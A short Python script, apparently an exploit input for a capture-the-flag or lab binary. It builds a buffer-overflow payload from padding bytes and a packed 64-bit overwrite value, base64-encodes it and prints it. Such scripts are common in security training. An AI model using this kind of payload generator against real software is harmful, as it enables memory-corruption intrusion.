
import sys
import struct
import base64

buf = b'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'
buf += struct.pack('<Q', 8568579592227511703)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
